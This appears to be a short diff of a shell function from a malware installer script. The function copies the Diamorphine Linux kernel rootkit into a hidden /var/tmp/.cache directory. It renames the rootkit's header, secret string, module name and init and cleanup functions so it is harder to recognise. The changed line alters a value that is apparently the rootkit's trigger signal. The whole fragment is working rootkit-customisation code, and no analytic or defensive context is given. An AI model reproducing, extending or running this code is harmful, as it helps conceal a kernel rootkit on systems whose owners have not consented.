@@ -21,7 +21,7 @@ modify_rk(){
 	mv /var/tmp/.cache/diamorphine.h /var/tmp/.cache/rk.h
 	sed -i 's/diamorphine_secret/demonized/g' /var/tmp/.cache/rk.h
 	sed -i 's/diamorphine/demonizedmod/g' /var/tmp/.cache/rk.h
-	sed -i 's/63/57/g' /var/tmp/.cache/rk.h
+	sed -i 's/63/62/g' /var/tmp/.cache/rk.h
 	sed -i 's/diamorphine.h/rk.h/g' /var/tmp/.cache/rk.c
 	sed -i 's/diamorphine_init/rk_init/g' /var/tmp/.cache/rk.c
 	sed -i 's/diamorphine_cleanup/rk_cleanup/g' /var/tmp/.cache/rk.c
